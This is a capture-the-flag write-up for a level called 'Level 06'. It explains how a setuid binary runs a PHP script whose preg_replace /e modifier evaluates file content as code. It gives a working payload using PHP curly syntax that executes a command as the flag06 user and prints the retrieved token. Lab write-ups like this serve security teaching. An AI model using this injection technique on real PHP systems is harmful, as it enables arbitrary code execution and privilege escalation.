# Level 06

As `level06`, running `ls` gives us a binary called `level06` and a PHP script named `level06.php` inside our home folder. Here's the sourcecode for the latter.

```php
  $> cat level06.php
  
  #!/usr/bin/php
  <?php
    function y($m) {
      $m = preg_replace("/\./", " x ", $m);
      $m = preg_replace("/@/", " y", $m);
      
      return $m;
    }

    function x($y, $z) {
      $a = file_get_contents($y);
      $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
      $a = preg_replace("/\[/", "(", $a);
      $a = preg_replace("/\]/", ")", $a);
      
      return $a; 
    }
    
    $r = x($argv[1], $argv[2]);
    print $r;
  ?>
```

> This script basically takes two arguments (the second is useless), the first one must be an existing file. It opens it, do a bunch of regular expression stuff on it and then prints the result on standard output.

The interesting part, the following line:

```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

> This regex uses a deprecated PHP only modifier infamously known for its security issues. Every occurence that matches the expression will be evaluated as PHP code. If we correctly format our file content we could execute arbitrary code with it.

Running `ls -l` to get more infos...

```shell
  $> ls -l
  total 12
  -rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06    
  -rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

Both files belong to `flag06` who has the right to execute `getflag`. So, like previous levels, we simply need to tinker our file content to call it and retrieve the flag. 

```shell
  $> echo '[x {${exec(getflag)}}]' > /tmp/getflag
  $> ./level06 /tmp/getflag
  PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp 
code on line 1
  PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```

> Using [curly syntax](https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex) we can ask PHP to replace a variable by its value. This way after `exec` evaluation the output message of `getflag` becomes the variable we try to access. Since PHP does not know it, an error with the original output is sent back to us.

So, `wiok45aaoguiboiki2tuin6ub` is the flag for this level.
